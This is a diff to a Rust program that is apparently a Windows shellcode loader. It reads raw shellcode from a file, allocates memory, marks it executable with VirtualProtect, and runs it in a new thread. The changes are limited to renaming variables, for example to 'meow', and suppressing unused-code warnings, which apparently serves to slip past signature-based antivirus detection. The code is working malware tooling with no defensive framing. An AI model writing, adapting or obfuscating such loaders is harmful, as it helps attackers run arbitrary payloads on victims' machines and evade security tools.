@@ -1,3 +1,5 @@
+#![allow(unused)]
+
 use std::fs::{File, OpenOptions};
 use std::io::{self, Read, Error};
 use std::{ptr, env};
@@ -17,10 +19,10 @@ fn read_shellcode(path: &str) -> Result<Vec<u8>, Error>{
         Err(e) => return Err(e)
     };
 
-    let mut payload_vec = Vec::new();
-    shellcode_bytes.read_to_end(&mut payload_vec);
+    let mut meow = Vec::new();
+    shellcode_bytes.read_to_end(&mut meow);
     
-    Ok(payload_vec)
+    Ok(meow)
 }
 
 fn copy_shellcode(payload: *const u8, mem_address: *mut u8, plenght: usize){
@@ -40,26 +42,26 @@ fn main(){
     }
 
     // read shellcode
-    let payload_vec = read_shellcode(&args[1]).expect("Failed to read shellcode.");
+    let meow = read_shellcode(&args[1]).expect("Failed to read shellcode.");
 
     unsafe {
         // Allocating memory
-        let l_address = VirtualAlloc(Some(ptr::null_mut()), payload_vec.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        let mem_addr = VirtualAlloc(Some(ptr::null_mut()), meow.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-        if l_address.is_null(){
+        if mem_addr.is_null(){
             println!("[-] VirtualAlloc failed with error {}", GetLastError().0);
         }
 
-        println!("[+] Memory Allocated at {:p}", &l_address);
+        println!("[+] Memory Allocated at {:p}", &mem_addr);
         
         //copy shellcode
-        copy_shellcode(payload_vec.as_ptr(), l_address as *mut u8, payload_vec.len());
+        copy_shellcode(meow.as_ptr(), mem_addr as *mut u8, meow.len());
 
         // Modify memory protection
-        VirtualProtect(l_address, payload_vec.len(), PAGE_EXECUTE_READWRITE, &mut PAGE_PROTECTION_FLAGS(0));
+        VirtualProtect(mem_addr, meow.len(), PAGE_EXECUTE_READWRITE, &mut PAGE_PROTECTION_FLAGS(0));
 
         // Create a local thread
-        let h_thread = CreateThread(Some(ptr::null()), 0, Some(std::mem::transmute(l_address)), Some(ptr::null()), THREAD_CREATION_FLAGS(0), Some(ptr::null_mut())).unwrap();
+        let h_thread = CreateThread(Some(ptr::null()), 0, Some(std::mem::transmute(mem_addr)), Some(ptr::null()), THREAD_CREATION_FLAGS(0), Some(ptr::null_mut())).unwrap();
         WaitForSingleObject(h_thread, INFINITE);
         CloseHandle(h_thread);
     };
